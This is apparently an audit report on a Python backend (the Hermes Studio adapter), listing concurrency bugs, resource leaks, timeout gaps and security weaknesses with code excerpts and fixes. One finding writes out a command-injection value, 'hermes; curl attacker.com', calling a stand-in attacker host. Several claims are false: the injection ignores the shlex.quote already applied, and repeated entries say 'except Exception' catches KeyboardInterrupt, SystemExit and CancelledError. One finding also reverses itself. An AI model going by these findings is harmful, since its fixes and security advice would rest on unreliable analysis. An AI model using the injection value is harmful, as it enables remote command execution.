# Hermes Adapter Backend Bug & Security Audit Report

**Audited files:** studio_routes.py, backend_base.py, hermes_backend.py, hermes_cli_backend.py, studio_storage.py, security.py, backend_factory.py, mock_backend.py, process_manager.py, approval_repository.py, input_validator.py

---

## CRITICAL BUGS

### 1. `StudioStorage._cached_conn` — Race Condition in Connection Reuse
**File:** studio_storage.py (lines 447-465)

The `connect()` context manager reuses `self._cached_conn` between calls. It does a `SELECT 1` health check before handing out the connection, but this check is NOT atomic with the transaction. Two concurrent requests can both pass the health check and receive the same connection object, leading to overlapping transactions that SQLite will serialize with `SQLITE_BUSY` errors — or worse, interleaved writes.

```python
if self._cached_conn is not None:
    try:
        self._cached_conn.execute("SELECT 1")  # NOT atomic with yield!
    except sqlite3.DatabaseError:
        self._cached_conn = None
```

**Impact:** Concurrent requests cause 503 errors or data corruption.

---

### 2. `StudioStorage.rollback_migration()` — Stale Cached Connection After Restore
**File:** studio_storage.py (lines 394-421)

When `rollback_migration()` restores from backup (`shutil.copy2(backup, self.db_path)`), it does NOT reset `self._cached_conn`. Subsequent `connect()` calls return the old connection pointing to the pre-rollback database file. The new data is invisible until a fresh connection is opened.

```python
# After this copy, _cached_conn still points to OLD db
shutil.copy2(backup, self.db_path)
return True
# ...but connect() will reuse the stale _cached_conn
```

**Impact:** Rollback silently appears to fail — data from backup is visible only after adapter restart.

---

### 3. `hermes_cli_backend.py` — Zombie stderr Task on Normal Exit
**File:** hermes_cli_backend.py (lines 268-287)

In `stream_run_events`, `stderr_task` (an asyncio task reading stderr) is only cancelled when a `TimeoutError` occurs. If the process exits normally (returncode 0 or error), the task is NOT cancelled and continues until the process stderr is fully consumed. For quick-failing commands, this is fine, but for long-running processes that get killed by the user, the stderr task may outlive the expected cleanup.

```python
finally:
    self._processes.pop(run_id, None)
    self._active_cli_runs.pop(run_id, None)
    # stderr_task is NOT cancelled here — leak on non-timeout exit path
```

**Impact:** Task leak if process is forcibly terminated via `stop_run` followed by normal completion.

---

### 4. `hermes_backend.py` — Circuit Breaker Race Condition (No Lock)
**File:** hermes_backend.py (lines 42-67)

The `_CircuitBreaker` class modifies `self._state` and `self._failure_count` from multiple concurrent tasks without any lock:

```python
def record_failure(self) -> None:
    self._failure_count += 1  # No lock!
    self._last_failure_time = asyncio.get_event_loop().time()  # No lock!
    if self._failure_count >= self._failure_threshold:
        self._state = "open"  # No lock!
```

Simultaneous `record_failure()` calls from concurrent SSE streams can cause the state machine to skip "half-open" or enter "open" incorrectly.

**Impact:** Circuit breaker may open/close at wrong thresholds under load.

---

### 5. `hermes_backend.py` — SSE Stream Silent Data Loss on JSON Decode Error
**File:** hermes_backend.py (lines 806-842, loop continues past shown snippet)

When parsing SSE data blocks, a `json.JSONDecodeError` silently continues to the next iteration without yielding any event or logging:

```python
try:
    raw_event = json.loads(data_str)
    ...
    yield normalized
except json.JSONDecodeError:
    continue  # Silently drops malformed data — no warning emitted
```

The client receives gaps in the event stream with no indication that data was lost.

**Impact:** Stream appears to stall or miss events; debugging is difficult.

---

## HIGH SEVERITY ISSUES

### 6. `hermes_cli_backend.py` — SSH Remote Command Injection via `remote_hermes_bin`
**File:** hermes_cli_backend.py (lines 349-352)

```python
def _base_cli_command(self, args: list[str]) -> list[str]:
    if self._remote_ssh_target:
        remote_command = " ".join(shlex.quote(part) for part in [self._remote_hermes_bin, *args])
        return ["ssh", self._remote_ssh_target, remote_command]
```

`self._remote_hermes_bin` comes from `HERMES_STUDIO_REMOTE_HERMES_BIN` env var. If a user configures a value like `"hermes; curl attacker.com"` it becomes `ssh user@host 'hermes; curl attacker.com'` — the semicolon injects an arbitrary command.

**Impact:** Remote code execution on the SSH target if the env var is user-controlled.

---

### 7. `studio_routes.py` — `/artifacts/{artifact_id}/browser-evidence` Missing Size Check on Artifact
**File:** studio_routes.py (lines 1796-1834)

When creating browser evidence, the artifact's `content_text` is written directly to a file with no size limit. A malicious artifact with a multi-gigabyte `content_text` field could exhaust disk or memory.

```python
preview_path.write_text(_safe_browser_preview_html(content_text), encoding="utf-8")
# content_text has no size check before writing
```

**Impact:** DoS via disk exhaustion or OOM.

---

### 8. `process_manager.py` — Workdir TOCTOU Race Between Check and Use
**File:** process_manager.py (lines 158-173)

```python
if os.path.commonpath([base_dir, workdir]) != base_dir:
    raise ValueError(f"Working directory is outside the adapter workspace: {requested}")
if not os.path.isdir(workdir):
    raise ValueError(f"Working directory does not exist or is not a directory: {requested}")
# ... time passes ...
process = await asyncio.create_subprocess_shell(
    template.command,
    cwd=workdir,  # workdir could be replaced with symlink to /etc between check and here
```

Between the directory check and the actual `create_subprocess_shell` call, the directory could be replaced with a symlink pointing outside the allowed workspace.

**Impact:** Arbitrary command execution outside allowed workspace.

---

### 9. `security.py` — `is_token_expired()` Compares `time.monotonic()` with `time.time()`
**File:** security.py (lines 69-80)

```python
def is_token_expired(max_age: float = DEFAULT_TOKEN_EXPIRY_SECONDS) -> bool:
    if _token_created_at is not None:
        return (time.monotonic() - _token_created_at) > max_age  # uses monotonic clock
    path = get_token_path()
    try:
        token_mtime = path.stat().st_mtime  # timestamp from file (wall clock)
    except FileNotFoundError:
        return True
    return (time.time() - token_mtime) > max_age  # uses wall clock — MIXED CLOCKS!
```

`_token_created_at` is set via `time.monotonic()` (line 51: `time.monotonic() if token else None`), but when checking a file-based token, `time.time()` (wall clock) is used. These measure different things — `time.monotonic()` is elapsed time since process start, `time.time()` is wall-clock time. After the first token rotation (where `rotate_token()` calls `set_auth_token(new_token)` which uses `time.monotonic()`), the in-memory path uses monotonic but the file path uses wall-clock. Expiry calculations will be incorrect.

**Impact:** Token may appear valid when it should be expired, or vice versa.

---

### 10. `approval_repository.py` — Dict Iteration During Iteration in `_safe_payload_value`
**File:** approval_repository.py (lines 109-122)

```python
if isinstance(value, Mapping):
    result: dict[str, Any] = {}
    for raw_key, raw_value in list(value.items())[:100]:  # materializes dict
        clean_key = _clean_text(raw_key, "payload key", max_length=120, required=True)
        result[clean_key] = _safe_payload_value(raw_value, key=clean_key)
    return result
```

Using `list(value.items())` handles dict modification safely (creates snapshot), but `list(value.items())[:100]` creates a copy of the entire items list, which is good. However, the slice `[:100]` is applied after materialization, so it correctly limits to 100 items. This is actually safe.

**Re-evaluate:** The code is actually correct here. But there's still a concern — `_safe_payload_value` is recursive and could cause stack overflow on deeply nested structures.

---

## MEDIUM SEVERITY ISSUES

### 11. `studio_routes.py` — `_run_local_hermes` 15-second hardcoded timeout too short for some commands
**File:** studio_routes.py (lines 358-361)

```python
async def _run_local_hermes(args: list[str], *, timeout: int = 15) -> subprocess.CompletedProcess[str]:
    def _run() -> subprocess.CompletedProcess[str]:
        return subprocess.run(["hermes", *args], capture_output=True, text=True, timeout=timeout, check=False)
```

`hermes doctor` can take 90 seconds (seen in `get_hermes_doctor` route at line 716: `timeout=90`), but the shared `_run_local_hermes` has a default of 15 seconds. When `hermes doctor` is called via `_run_local_hermes`, it would timeout unless the caller explicitly overrides.

**Impact:** Timeouts on slow Hermes commands.

---

### 12. `mock_backend.py` — `stream_run_events` Missing Cancellation Handling
**File:** mock_backend.py (lines 137-205)

The mock's `stream_run_events` runs through a fixed sequence of `asyncio.sleep()` calls to simulate events. If the caller cancels the iterator (e.g., client disconnects), the `asyncio.CancelledError` propagates and the generator terminates mid-stream — the run stays in `_active_runs` (it pops at the end of the generator, but only after the full sequence).

Looking more closely, the method yields `run.cancelled` events when `run_id in self._run_cancelled` is detected at each step, and it discards the run_id from `_run_cancelled` on cancellation. The final `self._active_runs.pop(run_id, None)` only executes if the generator runs to completion. If it's cancelled mid-stream, the run entry stays in `_active_runs` forever.

**Impact:** Zombie run entries in mock backend after mid-stream cancellation.

---

### 13. `studio_storage.py` — `_validate_db_path` Symlink Bypass
**File:** studio_storage.py (lines 296-300)

```python
def _is_hermes_state_db_path(path: Path) -> bool:
    expanded = path.expanduser()
    if _same_path(expanded, Path.home() / ".hermes" / "state.db"):
        return True
    return expanded.name == "state.db" and ".hermes" in expanded.parts
```

If an attacker creates `/home/user/hermes-desktop-studio/studio.db` as a symlink to `/home/user/.hermes/state.db`, the check at line 299 (`".hermes" in expanded.parts`) would pass because the symlink target's path contains `.hermes`. Wait — `expanded.parts` gives the parts of the symlink path itself, not the target. So a path `/home/user/hermes-desktop-studio/studio.db` wouldn't contain `.hermes` unless the user deliberately names it that way.

Actually, re-reading: the check is `expanded.name == "state.db" and ".hermes" in expanded.parts`. For `~/.hermes-desktop-studio/studio.db`, `.hermes-desktop-studio` parts are `('.', 'hermes-desktop-studio', 'studio.db')` — `.hermes` is not in there. The validation would pass.

However, the `_same_path` function uses `resolve(strict=False)` which DOES follow symlinks:
```python
def _same_path(left: Path, right: Path) -> bool:
    try:
        return left.expanduser().resolve(strict=False) == right.expanduser().resolve(strict=False)
```

So if `HERMES_STUDIO_DB_PATH` is set to `/workspace/studio.db` and that file is a symlink to `~/.hermes/state.db`, `_validate_db_path` would correctly block it because `resolve()` follows the symlink and `_same_path` catches it.

But there's still a gap: the path validation only checks the specific path given via `HERMES_STUDIO_DB_PATH`. If someone later replaces the symlink at that path after validation, the already-validated connection could end up pointing to Hermes state.

**Impact:** After env override and startup validation, the file could be swapped.

---

### 14. `backend_factory.py` — No Timeout on Backend Health Checks During Creation
**File:** backend_factory.py (lines 36-40)

```python
if mode == "local":
    backend = HermesCliBackend(hermes_url, hermes_key)
    health = await backend.health()  # No timeout — could hang indefinitely
    return backend, {...}
```

If Hermes local CLI is unresponsive, `await backend.health()` blocks the request indefinitely with no timeout. This affects all backend creation paths in "local", "gateway", and "auto" modes.

**Impact:** Adapter hangs if Hermes CLI is down during initialization.

---

### 15. `hermes_backend.py` — Missing `httpx.PoolTimeout` Handling in SSE Stream
**File:** hermes_backend.py (around line 860)

The SSE stream handler catches `httpx.ReadTimeout` and `httpx.RemoteProtocolError` but NOT `httpx.PoolTimeout`. If the connection pool is exhausted, the stream silently fails without emitting any event.

**Impact:** Stream appears to hang when connection pool is exhausted under load.

---

## LOW SEVERITY ISSUES

### 16. `approval_repository.py` — Truncation Without Word Boundary
**File:** approval_repository.py (lines 86-88)

```python
if len(cleaned) > max_length:
    cleaned = cleaned[: max_length - 3].rstrip() + "..."
```

Truncates at `max_length - 3` characters without word boundary awareness. Can cut words in half.

**Impact:** Unusual truncation behavior; not a security issue.

---

### 17. `process_manager.py` — `_stream_output` Task Not Tracked
**File:** process_manager.py (line 241)

```python
asyncio.create_task(self._stream_output(proc))
```

Created tasks are never stored. If the process completes before the task finishes reading stdout, the task continues running in the background until stdout is exhausted. There's no mechanism to wait for or cancel these tasks when the process is removed via `remove_process()`.

**Impact:** Orphaned tasks if process is removed from tracking before output is fully consumed.

---

### 18. `studio_routes.py` — Many Routes Use Generic `Exception` Catchers
**File:** studio_routes.py (e.g., line 1076, 1212, 1302, 1365, etc.)

Most routes wrap backend calls in `try/except Exception as e:` which catches everything, including `KeyboardInterrupt`, `asyncio.CancelledError`, and `SystemExit`. This masks bugs and makes debugging harder.

**Impact:** Hard to debug; unexpected exceptions are hidden behind generic 500 responses.

---

### 19. `studio_routes.py` — SSE Stream Generator Has No `finally` Cleanup for `warned_about_*` Flags
**File:** studio_routes.py (lines 1327-1339)

The `event_generator()` coroutine in `stream_run_events` has `warned_about_run_persistence` and `warned_about_approval_persistence` flags but no `finally` block to reset them. If the generator is never iterated to completion (client disconnects), these flags persist in the closure.

**Impact:** Minor memory leak of flag closures for disconnected clients.

---

### 20. `hermes_backend.py` — `close()` Method Missing from `HermesBackend`
**File:** hermes_backend.py

`HermesBackend` initializes `self._client = httpx.AsyncClient(timeout=30.0)` but there is no `close()` method to properly clean up the httpx client. The base class `StudioBackend` also doesn't define a close contract. `_patch_model_config_via_local_hermes` in studio_routes.py calls `await backend.close()` but this method doesn't exist on any backend class.

**Impact:** httpx client connections may not be released on backend teardown.

---

## SECURITY ISSUES

### S-1: No Request Body Size Limits on Most Endpoints
FastAPI route handlers don't validate incoming request body sizes. Large JSON payloads could cause memory exhaustion. The `input_validator.py` has `MAX_REQUEST_BODY_BYTES = 2 * 1024 * 1024` (2MB) but it's not enforced at the route level.

### S-2: Rate Limiting State Not Durable Across Restarts
The `_auth_failures` dict in security.py is in-memory only. An attacker who can trigger adapter restarts can re-authenticate after each restart with a fresh rate limit window.

### S-3: `studio.db` Not Encrypted at Rest
The SQLite database stores approval records, run history, session metadata, and potentially sensitive prompt content. It uses no encryption (no SQLCipher). Anyone with file access to the Studio data directory can read all historical data.

### S-4: No Audit Trail for Config and Model Config Changes
`patch_config` and `patch_model_config` endpoints modify persistent configuration but log no audit events. There's no record of who changed what, when, or from what IP.

### S-5: No CORS Configuration Visible
No explicit CORS configuration in `studio_routes.py`. FastAPI defaults to no CORS (same-origin only), which is appropriate if the adapter only serves the frontend. But if the adapter is deployed with cross-origin access, this needs explicit hardening.

---

## ERROR HANDLING GAPS

### E-1: `bootstrap` Endpoint Catches All Exceptions as 500
**File:** studio_routes.py (lines 315-323)

```python
@router.get("/bootstrap")
async def bootstrap(_token: None = Depends(require_token)) -> dict[str, Any]:
    backend = await _get_backend()
    try:
        data = await backend.bootstrap()
        ...
    except Exception as e:  # Too broad
        raise HTTPException(
            status_code=500,
            detail=_error_detail("bootstrap_error", str(e), retryable=True),
        ) from e
```

Catches `KeyboardInterrupt`, `SystemExit`, etc. Should catch specific backend exceptions.

### E-2: `_retry_with_backoff` in `hermes_backend.py` Retries Non-Idempotent Operations
**File:** hermes_backend.py (lines 73-89)

The retry wrapper is applied to `start_run`'s inner `_do_start` function. The `start_run` operation is NOT idempotent — retrying a started run could create duplicate runs. The retry wrapper uses `include_options=False` on retry (line 782) which may be intentional, but there's no idempotency key mechanism.

**Impact:** Duplicate runs on transient network failures.

### E-3: No Timeout on `_get_backend()` Lock Acquisition
**File:** studio_routes.py (lines 55-62)

```python
async def _get_backend() -> StudioBackend:
    global _backend, _backend_status
    if _backend is None:
        async with _backend_lock:  # Could wait indefinitely if lock is held
            if _backend is None:
                ...
```

If the backend initialization takes too long and the lock is contended, requests wait indefinitely. Should have a timeout on the lock acquisition.

---

## INTEGRATION PROBLEMS

### I-1: `list_available_models` in `HermesBackend` Uses Uninitialized `_config_repo`
**File:** hermes_backend.py (line 650)

```python
async def list_available_models(self) -> list[dict[str, Any]]:
    config = await self.get_model_config()  # calls _config_repo.get_model_config()
    models = config.get("available_models", [])
    return models if isinstance(models, list) else []
```

`get_model_config()` in HermesBackend (line 650) calls `self._config_repo.get_model_config()` if `_config_repo` is available. But `_config_repo` is initialized in `_init_repos()` which can fail with an exception (caught and logged as warning). If `_config_repo` initialization fails, `get_model_config()` returns the default dict. This seems fine, but there's a subtle issue: `_init_repos()` can throw, and if it does, all repos remain `None`, but subsequent calls to methods that depend on them won't clearly indicate why.

### I-2: `_model_name()` Swallows All Exceptions Silently
**File:** studio_routes.py (lines 112-116)

```python
async def _model_name(backend: StudioBackend) -> str | None:
    try:
        model_config = await backend.get_model_config()
    except Exception:
        return None
    model = model_config.get("model")
    return str(model) if model else None
```

Catches everything including `KeyboardInterrupt`, `asyncio.CancelledError`. If the model name is unavailable, the run ledger records `model=None` instead of surfacing the error.

### I-3: `_patch_config_via_local_hermes` and `_patch_model_config_via_local_hermes` Don't Close Their Backend Instances
**File:** studio_routes.py (lines 83-98, 101-114)

Both functions create a `HermesBackend` instance and call `await backend.close()` in a `finally` block. But `HermesBackend` has no `close()` method — so this is a no-op. The httpx client in each temporary backend instance is never closed.

---

## RECOMMENDATIONS SUMMARY

**Critical (fix immediately):**
1. Add lock to `_CircuitBreaker` in hermes_backend.py
2. Reset `_cached_conn` after `rollback_migration()`
3. Add `close()` method to `HermesBackend` (and all backends implementing it)
4. Add timeout to all backend health checks in `create_backend()`
5. Validate `HERMES_STUDIO_REMOTE_HERMES_BIN` as a safe path (no shell metacharacters)
6. Fix mixed clock comparison in `is_token_expired()`
7. Add `asyncio.CancelledError` handling in `stream_run_events` generators

**Security (address soon):**
1. Enforce `MAX_REQUEST_BODY_BYTES` at route level via middleware
2. Use SQLCipher for `studio.db` encryption at rest
3. Add audit logging for config/model-config changes
4. Implement IP-based rate limit persistence option
5. Add idempotency key mechanism to `start_run`

**Error handling (improve):**
1. Replace generic `except Exception` with specific exception types in all routes
2. Add timeout to `_get_backend()` lock acquisition
3. Add `finally` block to SSE event generators for cleanup
4. Track `_stream_output` tasks and cancel them on process removal